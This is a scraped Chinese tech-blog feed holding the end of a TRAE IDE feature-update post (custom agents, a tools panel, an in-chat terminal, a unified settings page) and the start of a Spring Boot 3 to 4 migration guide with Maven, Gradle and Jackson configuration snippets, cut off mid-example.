<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/414a96988b6f43148a19d6b8a4fce015~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=KGB7lCl2njOPOtrlNipAG7LV3%2BE%3D" alt="" loading="lazy"/></p>
<p><strong>输出结果：</strong> 问题修复完成，经过 3 个阶段：问题分析 -&gt; 发现问题 -&gt; 修复内容 解决了价格不一致的 Bug</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e48a405282834feb9cc40dfc89f97bfa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=VvM9Nv%2FgrUyKH78fOuA6zfTmUuY%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f71a23571b0488aa25b2d5b6f848743~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=2gzvVXd%2F90bAnyNOnBb8YzhvD4c%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-6"><strong>Custom Agent · 自定义智能体沉淀开发最佳实践</strong></h2>
<p>SOLO Builder 不仅能帮你完成开发任务，还能通过自定义智能体沉淀开发过程中的最佳实践，让每次编码都成为学习和积累的机会。</p>
<p><strong>场景：</strong> 新增一个学习总结类的智能体，用于沉淀每次编码沉淀的最佳实践</p>
<p><strong>用户输入（创建自定义智能体时）：</strong> 在给出代码学习建议，在生成完代码后 Review 下，给出一些知识点好让我知道在这次的需求中使用了哪些最佳实践，以便下次使用，帮我沉淀到项目目录下的 Learning.md 文件中</p>
<p><strong>实现流程：</strong></p>
<ul>
<li><strong>第 1 步：</strong> 在智能体页面新增自定义智能体 Code Learning Mentor</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4360072944eb40b3979b7686e6e4c1be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=kMqFRr%2BvtckH3y4eMR7cD2XGkiA%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>第 2 步：</strong> 在 SOLO Coder 中执行任务时，SOLO  Coder 在完成任务前会主动调用 Code Learning Mentor</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/edd6b88558fc412a95f4129f40d279cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=UP4jtp5nA%2By6l3zpSNK%2F5eQQU0A%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>第 3 步：</strong> 查看重构建议</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b848bf017a2440d3b72592dd529afcba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=ML7O63DDzWvCy8%2BTlVXo3ghV5Lw%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b32c88e6cde425ab50fac02699a8572~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=3m5G1jBvN%2FlLL7lbkNGvnrTgrb0%3D" alt="" loading="lazy"/></p>
<p><strong>Tools Panel · 灵活管理开发工具</strong></p>
<p>随着 SOLO 功能的不断丰富，如何高效管理和使用各类开发工具变得越来越重要。全新的 Tools Panel 让你可以根据实际需求自由调整工具布局。</p>
<h3 data-id="heading-7"><strong>使用场景</strong></h3>
<p>在之前的版本中，SOLO 模式顶部展示了多个工具 Tab，但展示的数量、顺序都是固定的无法调整。这在实际开发中带来了一些不便：</p>
<ul>
<li>
<p>并非所有工具都会用到，但始终打开的 Tab 会带来视觉上的干扰</p>
</li>
<li>
<p>在不同的开发阶段，工具的重要性不同。例如开发前期 Editor 和 Figma 更重要，后期浏览器和集成更重要，希望能将常用 Tab 拖动到更方便交互的位置</p>
</li>
</ul>
<p>在 SOLO 功能越来越丰富的情况下，工具 Tab 的管理能力显得尤为重要。</p>
<h3 data-id="heading-8"><strong>功能升级</strong></h3>
<h4 data-id="heading-9"><strong>Before</strong></h4>
<p>所有工具 Tab 默认打开，无法调整 Tab 顺序</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f53f20c7b1a24594a4c957c47e58bb82~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=plQBcW3dXOea5nTgS8aNmazftOU%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-10"><strong>After</strong></h4>
<p>✅ 支持拖动 tab 顺序</p>
<p>✅ 支持打开、关闭 Tab</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2ffd1ab12caf4a6b9b07af42ca5fae88~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=H3UCR2fGST510dxgGoLCs2Cy6%2FE%3D" alt="" loading="lazy"/>打开、关闭、拖动</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9b20748ff2be4f15a38daa49822cc7c3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=%2BAincbemMKoaVagbXezDnde9mSQ%3D" alt="" loading="lazy"/>空态打开</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a0c151aafa774b0aa79c7a1aa2b5a76b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=zDZ6Pt1BXlQh1RetuxSDgj6uDrg%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-11"><strong>Terminal · 命令执行过程一目了然</strong></h2>
<p>为了让命令执行过程更加透明可控，我们对 Terminal 进行了全面升级，现在你可以直接在对话中查看和交互命令执行过程。</p>
<h3 data-id="heading-12"><strong>功能升级</strong></h3>
<h4 data-id="heading-13"><strong>Before</strong></h4>
<p>模型执行命令，执行过程不能直接在对话中查看</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aba2972aa1304621bd4f17cc77b007e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=NZRZxGVNwpnqG2gm%2Be2%2BxH7MOzg%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-14"><strong>After</strong></h4>
<p>✅ 直接在对话中查看命令执行过程</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54ac8497284346c1945f3f17cd914e85~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=kVGZexzRCmPlM0VR%2B0zAlksYrBg%3D" alt="" loading="lazy"/></p>
<p>✅ 直接在对话的镜像终端中进行交互，如选择构建选项</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f799740380849178159393e6b702431~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=sYGgspk00jqx%2FNwo6KuTK8Wnggk%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de89867affce4fa6a0b021af58bc2512~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=dQ2yAywfLFARPwVqvEDnaKVKcfQ%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-15"><strong>Settings · 一站式设置中心</strong></h2>
<p>TRAE 在集成 AI 能力后，设置项分散在多个入口，有时候不知道需要的配置项在哪里，全新的统一设置中心解决了这一痛点。</p>
<h3 data-id="heading-16"><strong>使用场景</strong></h3>
<p>过往，设置分为了三个主要的作用域：</p>
<ul>
<li><strong>基础设置</strong></li>
<li><strong>TRAE IDE 设置</strong></li>
<li><strong>TRAE AI 能力设置</strong></li>
</ul>
<p>在升级之前，这些设置的入口在应用中是分散的，且 TRAE 相关的设置未支持搜索，导致探索 TRAE 的可配置功能比较麻烦，尝试修改设置时也需要先思考这个功能应该从哪个入口去配置。</p>
<h3 data-id="heading-17"><strong>功能升级</strong></h3>
<h4 data-id="heading-18"><strong>Before</strong></h4>
<p>AI 设置、TRAE 设置、IDE 设置，多种设置项入口分散，难以找到</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85299f80518a44f3ac4303f1b3343367~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=GGKO%2BIoVo%2FNyqLvI0BVDNIG%2BE1c%3D" alt="" loading="lazy"/>AI设置</p>
<p align="center">  </p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96910c48be5d483b84e560fd5853ad57~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=ZlKErgZzlcz5CnRcFmk3GIkqP0w%3D" alt="" loading="lazy"/>TRAE设置</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/89f91f960c48446c990d8dd7143cae9a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=j8M4vJ%2FtObuEK0sdpgrf7%2BbUF8s%3D" alt="" loading="lazy"/>IDE设置</p>
<h4 data-id="heading-19"><strong>After</strong></h4>
<p>✅ <strong>统一设置页入口</strong>，可以在一个页面中找到想要的所有设置，并支持搜索。</p>
<p>现在，你不需要再从多个设置入口尝试找到想要的功能配置。只需统一点击应用右上角的设置按钮，打开设置页，就可以看到所有可用的设置项及设置的入口集合。</p>
<p>如果不确定或没看到设置项在哪里，可以通过设置页左上角的搜索框搜索设置项。搜索功能支持全部作用域的设置功能。点击搜索结果，会自动跳转到对应的设置项并高亮提示。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1095ecc0cadd4192b7d464fe0ea17a16~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=9PybXa2JPmTJwXeQgsEr4vDiRpw%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从 Spring Boot 3 升级到 4：完整迁移指南]]></title>    <link>https://juejin.cn/post/7575751471842525220</link>    <guid>https://juejin.cn/post/7575751471842525220</guid>    <pubDate>2025-11-24T04:31:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575751471842525220" data-draft-id="7575751471842508836" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从 Spring Boot 3 升级到 4：完整迁移指南"/> <meta itemprop="keywords" content="后端,Spring Boot"/> <meta itemprop="datePublished" content="2025-11-24T04:31:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="架构师专栏"/> <meta itemprop="url" content="https://juejin.cn/user/2682464101221998"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从 Spring Boot 3 升级到 4：完整迁移指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2682464101221998/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    架构师专栏
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T04:31:55.000Z" title="Mon Nov 24 2025 04:31:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>兄弟们，鹏磊今天来聊聊从 Spring Boot 3 升级到 4 这事儿；说实话，这升级过程比想象中要复杂点，但也没那么吓人，只要按步骤来，基本都能搞定。别慌，慢慢来就行。</p>
<h2 data-id="heading-0">一、升级前准备</h2>
<p>升级之前，咱得先搞清楚几个事儿；别一上来就改代码，那样容易出问题。这事儿急不得，得一步步来。</p>
<h3 data-id="heading-1">1. 检查当前环境</h3>
<p>首先，你得知道你现在用的是啥版本；打开 <code>pom.xml</code> 或者 <code>build.gradle</code>，看看 Spring Boot 版本号。如果是 3.x 系列的，那就可以开始升级了；如果是 2.x 或者更老的版本，建议先升级到 3.x，再考虑升级到 4。</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 这是升级前的 pom.xml，看看你的版本是不是 3.x --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 这是你当前的版本，记下来 --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span>
</code></pre>
<h3 data-id="heading-2">2. JDK 版本要求</h3>
<p>这个最重要，Spring Boot 4 要求最低 JDK 17，推荐用 JDK 21；你要是还在用 JDK 8 或者 JDK 11，那对不起，得先升级 JDK。这事儿没商量，不升级 JDK 就别想用 Spring Boot 4。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 检查一下你的 JDK 版本</span>
java -version

<span class="hljs-comment"># 如果版本低于 17，得先升级 JDK</span>
<span class="hljs-comment"># 推荐用 JDK 21，性能好，虚拟线程支持也完整</span>
</code></pre>
<h3 data-id="heading-3">3. 备份代码</h3>
<p>升级之前，一定要备份代码；别嫌麻烦，万一出问题，还能回滚。用 Git 的话，先提交一下，或者创建一个新分支专门用来升级。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建升级分支</span>
git checkout -b upgrade-to-spring-boot-4

<span class="hljs-comment"># 提交当前代码</span>
git add .
git commit -m <span class="hljs-string">"准备升级到 Spring Boot 4"</span>
</code></pre>
<h2 data-id="heading-4">二、依赖升级</h2>
<h3 data-id="heading-5">1. 更新 Spring Boot 版本</h3>
<p>第一步，先把 Spring Boot 版本改成 4.0.0；Maven 和 Gradle 的配置不一样，咱分别说说。</p>
<p><strong>Maven 配置：</strong></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 升级后的 pom.xml，版本改成 4.0.0 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 改成 4.0.0，这是最新版本 --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>21<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span>  <span class="hljs-comment">&lt;!-- JDK 版本改成 21，推荐用这个 --&gt;</span>
    <span class="hljs-comment">&lt;!-- 或者用 17，最低要求 --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span>
</code></pre>
<p><strong>Gradle 配置：</strong></p>
<pre><code class="hljs language-groovy" lang="groovy">// build.gradle 配置
plugins {
    id 'org.springframework.boot' version '4.0.0'  // 版本改成 4.0.0
    id 'io.spring.dependency-management' version '1.1.4'
}

java {
    sourceCompatibility = '21'  // JDK 版本改成 21
    targetCompatibility = '21'
}
</code></pre>
<h3 data-id="heading-6">2. 添加属性迁移工具</h3>
<p>升级过程中，有些配置属性可能会被废弃或者改名；Spring Boot 提供了个工具叫 <code>spring-boot-properties-migrator</code>，能帮你检查这些废弃的属性。这玩意儿挺有用的，建议先加上。启动的时候会自动提示你哪些属性有问题。</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Maven 配置，添加属性迁移工具 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-properties-migrator<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>  <span class="hljs-comment">&lt;!-- runtime 作用域，只在运行时用 --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-groovy" lang="groovy">// Gradle 配置
dependencies {
    runtimeOnly 'org.springframework.boot:spring-boot-properties-migrator'  // 添加这个依赖
}
</code></pre>
<p>启动应用的时候，这个工具会自动检查废弃的属性，并在日志里提示你；等升级完了，记得把这个依赖删掉，不需要了。</p>
<h3 data-id="heading-7">3. 检查第三方依赖兼容性</h3>
<p>Spring Boot 4 升级了 Spring Framework 到 7.0，很多第三方依赖可能还没适配；你得一个个检查，看看有没有兼容 Spring Boot 4 的版本。</p>
<p>常见的依赖需要检查的：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 数据库相关 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-comment">&lt;!-- MySQL 驱动，检查版本 --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-comment">&lt;!-- Redis 相关 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-comment">&lt;!-- Redis，一般没问题 --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-comment">&lt;!-- 消息队列 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-amqp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-comment">&lt;!-- RabbitMQ，检查版本 --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>建议去各个依赖的官网看看，有没有发布兼容 Spring Boot 4 的版本；没有的话，可能得等一段时间，或者找替代方案。这事儿比较麻烦，但也没办法。</p>
<h2 data-id="heading-8">三、代码修改</h2>
<h3 data-id="heading-9">1. 废弃的 API 替换</h3>
<p>Spring Boot 4 废弃了一些 API，得替换掉；最常见的是 Jackson 2 相关的，Spring Boot 4 全面支持 Jackson 3 了，Jackson 2 的自动配置被标记为废弃。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 升级前，用的是 Jackson 2</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JacksonConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Jackson2ObjectMapperBuilder <span class="hljs-title function_">jackson2ObjectMapperBuilder</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 这个 API 在 Spring Boot 4 里被废弃了</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Jackson2ObjectMapperBuilder</span>();
    }
}

<span class="hljs-comment">// 升级后，改用 Jackson 3</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JacksonConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
